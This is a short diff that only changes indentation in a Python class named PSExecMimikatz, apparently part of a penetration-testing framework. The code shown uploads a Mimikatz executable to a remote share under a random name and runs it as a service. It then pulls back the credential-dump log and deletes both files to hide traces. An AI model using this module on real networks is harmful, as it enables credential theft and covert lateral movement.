@@ -33,25 +33,25 @@ class PSExecMimikatz(core.psexec.PSExec):
         mimipath = self.options.get("MIMIPATH")
         cmdline = self.options.get("CMDLINE")
 
-    	miminame = rpath + uuid.uuid4().hex + ".exe"
-    	logname = rpath + uuid.uuid4().hex + ".txt"
+        miminame = rpath + uuid.uuid4().hex + ".exe"
+        logname = rpath + uuid.uuid4().hex + ".txt"
 
 
         cmdline = cmdline.replace("~MIMINAME~", miminame)
         cmdline = cmdline.replace("~LOGNAME~", logname)
 
-    	self.print_status("Mimi file: %s" % miminame)
-    	self.print_status("Log file: %s" % logname)
+        self.print_status("Mimi file: %s" % miminame)
+        self.print_status("Log file: %s" % logname)
 
-    	conn.upload_file(share, miminame, mimipath)
-    	conn.service_exec(cmdline)
+        conn.upload_file(share, miminame, mimipath)
+        conn.service_exec(cmdline)
 
-    	out = conn.download_file(share, logname)
+        out = conn.download_file(share, logname)
 
-    	try:
-    		conn.delete_file(share, logname)
-    		conn.delete_file(share, miminame)
-    	except:
-    		pass
+        try:
+        	conn.delete_file(share, logname)
+        	conn.delete_file(share, miminame)
+        except:
+        	pass
 
-    	return out
+        return out
